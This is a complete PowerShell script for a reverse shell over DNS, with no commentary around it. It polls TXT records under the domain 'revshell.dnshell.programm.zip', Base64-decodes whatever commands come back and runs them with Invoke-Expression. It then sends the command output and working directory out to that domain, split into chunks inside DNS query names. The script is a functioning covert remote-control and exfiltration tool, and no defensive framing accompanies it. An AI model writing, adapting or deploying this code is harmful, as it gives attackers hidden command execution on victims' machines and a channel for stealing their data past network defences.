function Send-Data {
    param (
        $data,
        $code,
        $counter
    )
    
    # Encode data as Base64
    $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
    
    # Replace padding characters with _ so it can be transmitted over DNS
    $encodedData = $encodedData.Replace("=", "_")
    
    $chunk_size = 63 # Max size of a DNS label (between two dots)
    $chunks = [Math]::Ceiling($encodedData.Length / $chunk_size) # Calculate the number of chunks
        
    for ($i = 0; $i -lt $chunks; $i++) {
        Write-Host "Sending Chunk $($i+1) of $chunks"
        $currentChunk = $encodedData.Substring($i * $chunk_size, [Math]::Min($chunk_size, $encodedData.Length - $i * $chunk_size))
        $query = "$i.$chunks.$code-$counter.$domain"
        $dnsQuery = "$currentChunk.$query"

        # Send DNS query
        $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore

        if ($dnsResult) {
            # Never has a response ready, hopefully :-)
        }
    }
}

$domain = "revshell.dnshell.programm.zip"
$code = (Get-Date).ToString("yyyyMMddHHmmss")

# Send code to DNS server
Send-Data -data $code -code 0 -counter 0

# Request TXT record from DNS server
$commandcount = 0
$stop = $false
while (!$stop) {
    Write-Host "Request to: $commandcount.$code.$domain"
    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -DnsOnly -ErrorAction Ignore
    if ($dnsResult) {
        try{
            $command = $dnsResult.Strings
            $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
            $output = $command | Invoke-Expression -ErrorAction Stop
            $output = ($output | Format-Table | Out-String)
            Write-Host "Send Output with length $($output.Length)"
            if($output.Length -eq 0){
                $output = "No output from this command"
            }
            # Send current PWD
            Write-Host "Sending current PWD: $($PWD.Path)"
            Send-Data -data $PWD.Path -code "pwd-$code" -counter $commandcount
            Write-Host "Sending Output"
            Send-Data -data $output -code $code -counter $commandcount
        }
        catch {
            Write-Host "Sending current PWD: $($PWD.Path)"
            Send-Data -data $PWD.Path -code "pwd-$code" -counter $commandcount
            Send-Data -data "Error: $_" -code $code -counter $commandcount
        }
        $commandcount++
    }
    else {
        
    }
    Start-Sleep -Seconds 2
}